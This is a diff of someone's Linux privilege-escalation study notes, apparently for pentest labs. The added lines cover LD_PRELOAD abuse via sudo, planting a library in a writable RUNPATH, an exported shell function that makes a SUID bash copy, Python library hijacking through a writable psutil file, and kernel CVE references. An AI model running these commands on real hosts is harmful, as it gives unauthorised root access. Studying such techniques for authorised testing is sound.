@@ -53,8 +53,11 @@ if nothing on gtfobins for sudo listed binaries, its still possible to escalate 
 examples: wget to read/post shadow file, apache2 to read shadow file  -- just google  
 #### Via LD_PRELOAD  
 sudo –l shows env_keep+=LD_PRELOAD is enabled  //if enabled  
+ldd /bin/ls   //LISTS ALL THE LIBRARIES REQUIRED BY ls along with paths  
 !! Loads malicious library before all libraries !!  
 https://medium.com/@amaraltohami30/ld-preload-privilege-escalation-linux-priv-escalation-c8abdf1a9bec  
+gcc -fPIC -shared -o root.so root.c -nostartfiles  
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart  //assuming sudo perm to run apache2 restart  
 #### Outdated sudo  
 CVE-2019-14287: sudo before 1.8.28 vulnerable to  if allowed to execute all except for root  
 hacker ALL=(ALL,!root) /bin/bash  //can run bash except as root  
@@ -94,7 +97,7 @@ find / -type f -perm -4000 -ls 2>/dev/null
 say custom binary with no gtfo exploit.. no shared injection  
 strings /usr/local/bin/suid-env  //try check if its calling something inside,  
 so this is running service apache2 start command – no full path for service  
-place a malicious service in tmp and add tmp to PATH 
+place a malicious service in tmp and add tmp to PATH  
 export PATH=/tmp:$PATH  //running suid exe should now refer malicious service giving elevated bash  
 Say, full path is in use /usr/bin/service apache2 start  
 //can declare a function of that name /usr/bin/service and add it to env variable which gets run on suid file exe  
@@ -102,6 +105,14 @@ function /usr/bin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bas
 export -f /usr/bin/service  //exporting the function as env varia  
 //running the suid binary now gives an elevated bash !!  
 Question around this -- what's the root cause here ? how define any such calls in suid files ?  
+//Another method, check the RUNPATH where libraries can be loaded from - if path is wRitable place a malicious library here  
+ldd payroll    //show sthe liraries loaded and its path  //found unusual library wiht path /develpoment  
+readelf -d payroll  | grep PATH   //check RUNASPATH -- reveals /development is the custom location from where app can load libraries from firt in order  
+ls -la /development  //reveals path is writable  
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so  //copy the same named libary to /development and run app  
+./payroll  //running from development throws an error undefined symbol: dbquery  -- so its looking for function dbquery.
+//priv.c rename the function and place it here  
+./payroll   //now should give elevated shell by running malicious function library file  
 
 #### Escalation via Binary Symlinks  
 one of the tests, cron jobs had a symlink run by root - not vulnerable, as symlink dire was not writable  
@@ -215,7 +226,8 @@ id     //check our group member part of dev group
 tmux –S /shareds   //attach to the shared tmus session and confirm root privileges  
 dd  
 
-## Kernel Exploits:  Kernel is an interface between software and hardware.  
+## Linux Internals-based privilege escalation  
+### 1. Kernel Exploits:  Kernel is an interface between software and hardware.  
 Note: Kernel exploits can cause system instability so use caution when running these against a production system.  
 And some work out of the box and some require modification.  Google kernel/OS version to find any ..  
 uname -a   //print kernel version
@@ -225,3 +237,23 @@ User exploit suggester to suggest any available exploits
 Well known exploits:  
 Dirty Cow - Linux Kernel 2.6.22 < 3.9  - CVE-2016-5195 - Race condition  
 CVE-2017-16995 Linux Kernel < 4.4.0-116 – Ubuntu 16.04.4 - Buffer overflow   
+CVE-2021-3493 -- Ubuntu 18.04  
+### 2. Shared Libraries -- DL_preload sudo  
+### 3.Shared Object Injnection -- suid shared object injection  
+### 4. Python Library Hijacking  
+Python is popular becuase it provides vast collection of libraries  
+has the standard library on board from a standard installation  
+3 ways to import a library or module  
+#!/usr/bin/env python3  
+import pandas  // from pandas import *  //from pandas import Series  
+there are three basic vulnerabilities where hijacking can be used, depending on the script and its contents.  
+#### Wrong write permissions  
+ls -l test.py    //has sudo/suid bit set run as root //read the file 
+read reveals it loads a module named psutil and calls function virtual_memory()  
+grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*  //find code with the function in the module  
+___init___.py is writable file  //just put below at the beginging of the functions in htis case virtual_memory()  
+// Hijacking
+	import os
+	os.system('id')
+Now run the script and should get root id  
+#### Library path  
